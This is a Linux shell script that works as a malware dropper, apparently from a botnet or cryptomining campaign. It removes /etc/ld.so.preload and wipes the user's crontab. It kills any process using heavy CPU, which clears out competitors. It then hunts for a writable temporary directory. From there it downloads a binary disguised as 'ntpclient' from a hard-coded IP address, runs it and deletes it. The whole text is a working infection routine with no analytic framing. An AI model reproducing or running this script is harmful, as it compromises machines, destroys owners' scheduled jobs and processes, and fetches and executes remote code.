#!/bin/sh

echo "SHELL LOADED"

ulimit -n 65535
rm -f /etc/ld.so.preload

sed -i '/wget/d' .profile
sed -i '/curl/d' .profile
sed -i '/curl/d' .bashrc
sed -i '/wget/d' .bashrc

crontab -r

VAR=$(ps uwx|awk '{print $2":"$3}'| grep -v CPU)
for word in $VAR
do
    CPUUSAGE=$(echo $word|awk -F":" '{print $2}'|awk -F"." '{ print $1}')
    if [ $CPUUSAGE -gt 55 ]
    then
       echo BIG $word
       PID=$(echo $word | awk -F":" '{print $1'})
       LINE=$(ps uwx | grep $PID)
       COUNT=$(echo $LINE| grep -P "|wget|curl|ssh|grep|echo|awk|ps"|wc -l)
       if [ $COUNT -eq 0 ]
       then
           echo Skipping $line
       fi
       echo KILLING $line
       kill $PID
   fi
done

>/tmp/.a && cd /tmp
>/var/tmp/.a && cd /var/tmp
>/run/shm/a && cd /run/shm
>/dev/.a && cd /dev
>/dev/shm/.a && cd /dev/shm

for fs in `cat /proc/mounts | grep -i tmpfs | grep -v noexe | awk {'print $0'} | cut -d ' ' -f 2`; do >$fs/.a && cd $fs; done

rm -rf .a
rm -rf ntpclient

wget http://185.243.56.167/x86/ntpclient -O- > ntpclient; chmod 777 ntpclient || (cp $SHELL Mozz; >Mozz; cat ntpclient > Mozz; rm -rf ntpclient; cp Mozz ntpclient; rm -rf Mozz); ./ntpclient load.x86; rm -rf ntpclient
curl http://185.243.56.167/x86/ntpclient > ntpclient; chmod 777 ntpclient || (cp $SHELL Mozz; >Mozz; cat ntpclient > Mozz; rm -rf ntpclient; cp Mozz ntpclient; rm -rf Mozz); ./ntpclient load.x86; rm -rf ntpclient

wget http://185.243.56.167/x86_64/ntpclient -O- > ntpclient; chmod 777 ntpclient || (cp $SHELL Mozz; >Mozz; cat ntpclient > Mozz; rm -rf ntpclient; cp Mozz ntpclient; rm -rf Mozz); ./ntpclient load.x86_64; rm -rf ntpclient
curl http://185.243.56.167/x86_64/ntpclient > ntpclient; chmod 777 ntpclient || (cp $SHELL Mozz; >Mozz; cat ntpclient > Mozz; rm -rf ntpclient; cp Mozz ntpclient; rm -rf Mozz); ./ntpclient load.x86_64; rm -rf ntpclient

echo "SHELL UNLOADED"
